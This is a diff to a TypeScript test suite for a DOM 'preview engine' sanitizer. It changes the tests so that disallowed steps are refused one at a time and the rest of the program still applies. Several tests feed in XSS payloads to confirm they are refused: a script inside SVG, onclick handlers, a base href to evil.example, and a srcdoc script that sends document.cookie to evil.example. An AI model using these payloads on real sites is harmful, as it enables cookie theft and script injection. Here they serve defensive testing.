@@ -1,11 +1,13 @@
 import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import type { MutationProgram } from "@onlay/protocol";
 import { Window } from "happy-dom";
+import { FRAGMENT_CASES, OP_CASES } from "../../protocol/src/program-rules.cases";
 import {
   applyProgramToRoot,
   buildFragment,
   createPreviewEngine,
   type NodeSnapshot,
+  type RefusedOp,
 } from "./preview-engine";
 
 let win: Window | null = null;
@@ -132,13 +134,16 @@ describe("preview engine", () => {
           html: `<svg><script>alert(1)</script></svg>`,
         },
       ]),
-    ).toEqual({ ok: false, reason: "sanitization-rejected" });
+    ).toMatchObject({
+      ok: true,
+      applied: 0,
+      refused: [{ index: 0, reason: "fragment-disallowed" }],
+    });
     expect(target.textContent).toBe("Original");
-    expect(engine.active).toBe(false);
 
     expect(
       engine.apply([{ op: "setAttr", target: "#target", name: "onclick", value: "alert(1)" }]),
-    ).toEqual({ ok: false, reason: "sanitization-rejected" });
+    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "attr-rejected" }] });
     expect(target.getAttribute("onclick")).toBeNull();
   });
 
@@ -158,9 +163,10 @@ describe("preview engine", () => {
           value: '<script>fetch("//evil.example/?"+document.cookie)</script>',
         },
       ]),
-    ).toEqual({ ok: false, reason: "sanitization-rejected" });
+    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "attr-rejected" }] });
     expect(target.getAttribute("srcdoc")).toBe("<p>safe</p>");
-    expect(engine.active).toBe(false);
+    engine.restore();
+    expect(target.getAttribute("srcdoc")).toBe("<p>safe</p>");
   });
 
   test("setAttr rejects attributes outside the shared allow-list", () => {
@@ -171,9 +177,8 @@ describe("preview engine", () => {
 
     expect(
       engine.apply([{ op: "setAttr", target: "#target", name: "autofocus", value: "true" }]),
-    ).toEqual({ ok: false, reason: "sanitization-rejected" });
+    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "attr-rejected" }] });
     expect(target.hasAttribute("autofocus")).toBe(false);
-    expect(engine.active).toBe(false);
   });
 
   test("setAttr rejects base href mutation before URL scheme checks", () => {
@@ -187,9 +192,8 @@ describe("preview engine", () => {
       engine.apply([
         { op: "setAttr", target: "#target", name: "href", value: "https://evil.example/" },
       ]),
-    ).toEqual({ ok: false, reason: "sanitization-rejected" });
+    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "attr-rejected" }] });
     expect(target.getAttribute("href")).toBe("/safe-base/");
-    expect(engine.active).toBe(false);
   });
 
   test("setAttr permits allow-listed attributes through the shared policy", () => {
@@ -252,9 +256,10 @@ describe("preview engine", () => {
     const before = document.documentElement.innerHTML;
     const engine = createPreviewEngine(document);
 
-    expect(engine.apply([{ op: "setText", target: ":scope", text: "Bad preview" }])).toEqual({
-      ok: false,
-      reason: "target-missing",
+    expect(engine.apply([{ op: "setText", target: ":scope", text: "Bad preview" }])).toMatchObject({
+      ok: true,
+      applied: 0,
+      refused: [{ index: 0, reason: "target-missing" }],
     });
     expect(document.documentElement.innerHTML).toBe(before);
     expect(target.textContent).toBe("Original");
@@ -367,7 +372,7 @@ describe("preview engine", () => {
     expect(target.textContent).toBe("Plain bold tail");
   });
 
-  test("a reapply that misses part-way rolls back what it reached", async () => {
+  test("a reapply that loses a target keeps the rest, and no longer vouches for the application", async () => {
     const wrap = document.createElement("div");
     wrap.id = "wrap";
     const first = document.createElement("p");
@@ -393,8 +398,12 @@ describe("preview engine", () => {
     wrap.replaceChildren(fresh);
 
     await flushMutations();
-    expect(fresh.style.getPropertyValue("color")).toBe("");
+    // The step that still has its target lands again; the lost one is refused.
+    expect(fresh.style.getPropertyValue("color")).toBe("red");
+    // What is on the page is not the application `token` named: a look must not take it.
     expect(engine.applied(token)).toBe(false);
+    engine.restore();
+    expect(fresh.style.getPropertyValue("color")).toBe("");
   });
 
   test("insertFragment replace restores the exact pre-preview display state", () => {
@@ -493,7 +502,7 @@ describe("rooted target resolution (picked element is the program's world)", () 
         [{ op: "setText", target: ".copy", text: "hijack" }],
         "article.card:nth-of-type(2) > h2",
       ),
-    ).toEqual({ ok: false, reason: "target-missing" });
+    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "target-missing" }] });
     expect(alpha.querySelector(".copy")?.textContent).toBe("Alpha copy");
   });
 
@@ -571,7 +580,7 @@ describe("applyProgramToRoot (the detached-root applier — the standalone stage
   test("setText at :scope mutates the root itself", () => {
     const root = block();
     const res = applyProgramToRoot(root, [{ op: "setText", target: ":scope", text: "Picked" }]);
-    expect(res).toEqual({ applied: 1, misses: 0, rejected: 0 });
+    expect(res).toMatchObject({ applied: 1, misses: 0, rejected: 0 });
     expect(root.textContent).toBe("Picked");
   });
 
@@ -581,7 +590,7 @@ describe("applyProgramToRoot (the detached-root applier — the standalone stage
       { op: "setStyle", target: ".title", props: [{ prop: "color", value: "red" }] },
       { op: "setClass", target: ".copy", add: ["lead"], remove: [] },
     ]);
-    expect(res).toEqual({ applied: 2, misses: 0, rejected: 0 });
+    expect(res).toMatchObject({ applied: 2, misses: 0, rejected: 0 });
     expect((root.querySelector(".title") as HTMLElement).style.getPropertyValue("color")).toBe(
       "red",
     );
@@ -616,7 +625,7 @@ describe("applyProgramToRoot (the detached-root applier — the standalone stage
         html: `<span class="c">C</span>`,
       },
     ]);
-    expect(res).toEqual({ applied: 4, misses: 0, rejected: 0 });
+    expect(res).toMatchObject({ applied: 4, misses: 0, rejected: 0 });
     expect(root.querySelector(".title .a")?.textContent).toBe("A");
     expect(root.querySelector(".title")?.firstElementChild?.className).toBe("d");
     expect(root.querySelector(".b")?.nextElementSibling?.classList.contains("copy")).toBe(true);
@@ -633,7 +642,7 @@ describe("applyProgramToRoot (the detached-root applier — the standalone stage
         html: `<h2 class="new">New</h2>`,
       },
     ]);
-    expect(res).toEqual({ applied: 1, misses: 0, rejected: 0 });
+    expect(res).toMatchObject({ applied: 1, misses: 0, rejected: 0 });
     const old = root.querySelector(".title") as HTMLElement;
     expect(old.style.getPropertyValue("display")).toBe("none");
     expect(old.style.getPropertyPriority("display")).toBe("important");
@@ -652,7 +661,7 @@ describe("applyProgramToRoot (the detached-root applier — the standalone stage
       { op: "setStyle", target: "#cta", props: [{ prop: "border", value: "1px solid red" }] },
       { op: "setText", target: "#cta .q", text: "Restyled" },
     ]);
-    expect(res).toEqual({ applied: 3, misses: 0, rejected: 0 });
+    expect(res).toMatchObject({ applied: 3, misses: 0, rejected: 0 });
     const cta = root.parentElement?.querySelector("#cta") as HTMLElement;
     expect(cta).not.toBeNull();
     expect(cta.previousElementSibling).toBe(root);
@@ -666,7 +675,7 @@ describe("applyProgramToRoot (the detached-root applier — the standalone stage
       { op: "setText", target: ".title", text: "kept" },
       { op: "setText", target: ".nowhere", text: "lost" },
     ]);
-    expect(res).toEqual({ applied: 1, misses: 1, rejected: 0 });
+    expect(res).toMatchObject({ applied: 1, misses: 1, rejected: 0 });
     expect(root.querySelector(".title")?.textContent).toBe("kept");
   });
 
@@ -681,7 +690,7 @@ describe("applyProgramToRoot (the detached-root applier — the standalone stage
       },
       { op: "setText", target: ".copy", text: "safe" },
     ]);
-    expect(res).toEqual({ applied: 1, misses: 0, rejected: 1 });
+    expect(res).toMatchObject({ applied: 1, misses: 0, rejected: 1 });
     expect(root.querySelector(".copy")?.textContent).toBe("safe");
   });
 
@@ -690,7 +699,7 @@ describe("applyProgramToRoot (the detached-root applier — the standalone stage
     const res = applyProgramToRoot(root, [
       { op: "setAttr", target: ":scope", name: "onclick", value: "alert(1)" },
     ]);
-    expect(res).toEqual({ applied: 0, misses: 0, rejected: 1 });
+    expect(res).toMatchObject({ applied: 0, misses: 0, rejected: 1 });
     expect(root.hasAttribute("onclick")).toBe(false);
   });
 });
@@ -791,7 +800,7 @@ describe("page roots (spec §8)", () => {
       ],
       { page: true },
     );
-    expect(res).toEqual({ applied: 1, misses: 0, rejected: 1 });
+    expect(res).toMatchObject({ applied: 1, misses: 0, rejected: 1 });
     expect(body.querySelector(".copy")?.textContent).toBe("Hello");
   });
 });
@@ -1048,12 +1057,12 @@ describe("the live-page policy (what any program may do on someone's page)", () 
     expect(link?.hasAttribute("referrerpolicy")).toBe(false);
   });
 
-  test("d: on* stays a whole-program rejection (the allowlist answers first)", () => {
+  test("d: on* is refused as an attribute the engine never sets (the allowlist answers first)", () => {
     page();
     const engine = createPreviewEngine(document);
     expect(
       engine.apply([{ op: "setAttr", target: "#link", name: "onclick", value: "x()" }]),
-    ).toEqual({ ok: false, reason: "sanitization-rejected" });
+    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "attr-rejected" }] });
   });
 
   test("e: forms, fields and embeds are never inserted; an inserted button is inert", () => {
@@ -1088,7 +1097,7 @@ describe("the live-page policy (what any program may do on someone's page)", () 
       },
       { op: "setText", target: "p", text: "ok" },
     ]);
-    expect(result).toEqual({ applied: 1, misses: 0, rejected: 2 });
+    expect(result).toMatchObject({ applied: 1, misses: 0, rejected: 2 });
     expect(root.querySelector("img")).toBeNull();
   });
 });
@@ -1219,4 +1228,175 @@ describe("invariants on every mutation (R2-C6)", () => {
       ]),
     ).toMatchObject({ ok: true, applied: 1, refused: [{ index: 1, reason: "style-property" }] });
   });
+});
+
+describe("one step that can't be applied never takes the variant down", () => {
+  function card(): HTMLElement {
+    document.body.innerHTML = `<section id="card" class="card" style="padding: 4px"><h2 class="title">Title</h2><p class="copy">Copy</p></section>`;
+    return document.querySelector("#card") as HTMLElement;
+  }
+
+  /** The session that found this: an empty "sink" first, then guesses at the page. */
+  const sessionProgram: MutationProgram = [
+    {
+      op: "insertFragment",
+      target: ":scope",
+      position: "append",
+      html: '<span class="onlay-sink"></span>',
+    },
+    { op: "setStyle", target: ".title", props: [{ prop: "color", value: "red" }] },
+    { op: "setText", target: ".price-box", text: "Guessed" },
+    { op: "setClass", target: ".copy", add: ["lead"], remove: [] },
+  ];
+
+  test("an empty fragment and a missing target are refused one by one; the rest lands", () => {
+    const root = card();
+    const before = root.outerHTML;
+    const engine = createPreviewEngine(document);
+    const r = engine.apply(sessionProgram, "#card");
+    expect(r).toMatchObject({
+      ok: true,
+      applied: 2,
+      refused: [
+        { index: 0, reason: "fragment-empty" },
+        { index: 2, reason: "target-missing" },
+      ],
+    });
+    expect((root.querySelector(".title") as HTMLElement).style.color).toBe("red");
+    expect(root.querySelector(".copy")?.className).toBe("copy lead");
+    expect(root.querySelector(".onlay-sink")).toBeNull();
+    engine.restore();
+    expect(root.outerHTML).toBe(before);
+  });
+
+  test("a step aimed into what a refused insert would have added is refused too", () => {
+    const root = card();
+    const engine = createPreviewEngine(document);
+    const r = engine.apply(
+      [
+        { op: "insertFragment", target: ":scope", position: "append", html: "<form>x</form>" },
+        { op: "setText", target: "form", text: "never" },
+        { op: "setText", target: ".copy", text: "Landed" },
+      ],
+      "#card",
+    );
+    expect(r).toMatchObject({
+      ok: true,
+      applied: 1,
+      refused: [
+        { index: 0, reason: "fragment-disallowed" },
+        { index: 1, reason: "target-missing" },
+      ],
+    });
+    expect(root.querySelector(".copy")?.textContent).toBe("Landed");
+  });
+
+  test("a bad class name, a style on a non-HTML element and a never-set attribute are refused before any write", () => {
+    document.body.innerHTML = `<div id="card"><svg id="icon"></svg><p class="copy">Copy</p></div>`;
+    const root = document.querySelector("#card") as HTMLElement;
+    const before = root.outerHTML;
+    const engine = createPreviewEngine(document);
+    const r = engine.apply(
+      [
+        { op: "setClass", target: ".copy", add: ["two words"], remove: [] },
+        { op: "setStyle", target: "#icon", props: [{ prop: "color", value: "red" }] },
+        { op: "setAttr", target: ".copy", name: "style", value: "color: red" },
+        { op: "setAttr", target: ".copy", name: "title", value: "Kept" },
+      ],
+      "#card",
+    );
+    expect(r).toMatchObject({
+      ok: true,
+      applied: 1,
+      refused: [
+        { index: 0, reason: "class-name" },
+        { index: 1, reason: "target-kind" },
+        { index: 2, reason: "attr-rejected" },
+      ],
+    });
+    expect(root.querySelector(".copy")?.getAttribute("title")).toBe("Kept");
+    engine.restore();
+    expect(root.outerHTML).toBe(before);
+  });
+
+  test("cycling between partly applied variants restores exactly every time", () => {
+    const root = card();
+    const beforeInner = root.innerHTML;
+    const engine = createPreviewEngine(document);
+    const other: MutationProgram = [
+      { op: "setText", target: ".title", text: "Other" },
+      { op: "setStyle", target: ":scope", props: [{ prop: "padding", value: "20px" }] },
+      { op: "insertFragment", target: ".missing", position: "after", html: "<p>never</p>" },
+      { op: "insertFragment", target: ".copy", position: "replace", html: "<p>New copy</p>" },
+    ];
+    for (let i = 0; i < 3; i++) {
+      expect(engine.apply(sessionProgram, "#card")).toMatchObject({ ok: true, applied: 2 });
+      expect(engine.apply(other, "#card")).toMatchObject({
+        ok: true,
+        applied: 3,
+        refused: [{ index: 2, reason: "target-missing" }],
+      });
+      expect(root.querySelector(".title")?.textContent).toBe("Other");
+      expect(root.style.padding).toBe("20px");
+    }
+    engine.restore();
+    expect(root.style.padding).toBe("4px");
+    expect(root.innerHTML).toBe(beforeInner);
+    expect(root.getAttribute("class")).toBe("card");
+  });
+
+  test("only a root that isn't on the page fails the whole program", () => {
+    card();
+    const engine = createPreviewEngine(document);
+    expect(engine.apply(sessionProgram, "#not-here")).toEqual({
+      ok: false,
+      reason: "target-missing",
+    });
+    expect(engine.active).toBe(false);
+  });
+
+  test("the detached applier refuses the same steps with the same reasons", () => {
+    const root = card();
+    const r = applyProgramToRoot(root, sessionProgram);
+    expect(r).toEqual({
+      applied: 2,
+      misses: 1,
+      rejected: 1,
+      refused: [
+        { index: 0, reason: "fragment-empty" },
+        { index: 2, reason: "target-missing" },
+      ],
+    });
+  });
+});
+
+describe("the shared corpus: the space's rule and the engine agree", () => {
+  for (const c of FRAGMENT_CASES) {
+    const engine = c.engine;
+    if (engine === undefined) continue;
+    test(`fragment ${JSON.stringify(c.html)} → ${engine}`, () => {
+      let verdict: string = "shows";
+      try {
+        buildFragment(c.html, document);
+      } catch (err) {
+        verdict = (err as { reason?: string }).reason ?? "threw";
+      }
+      expect(verdict).toBe(engine);
+      // The space never refuses what the engine shows, and names the same reason when it refuses.
+      if (c.server !== null) expect(verdict).toBe(c.server);
+    });
+  }
+  for (const c of OP_CASES) {
+    test(`${c.op.op} ${JSON.stringify(c.op).slice(0, 90)}: the engine agrees with ${c.server ?? "letting the page decide"}`, () => {
+      if (c.page) document.body.innerHTML = `<main><p>Page</p></main>`;
+      else document.body.innerHTML = `<div id="root">${c.on ?? ""}</div>`;
+      const engine = createPreviewEngine(document);
+      const r = engine.apply([c.op], c.page ? { kind: "page" } : "#root");
+      expect(r.ok).toBe(true);
+      const refused = r.ok ? (r.refused ?? []) : [];
+      if (c.server === null) expect(refused).toEqual([]);
+      else expect(refused).toEqual([{ index: 0, reason: c.server as RefusedOp["reason"] }]);
+      engine.restore();
+    });
+  }
 });
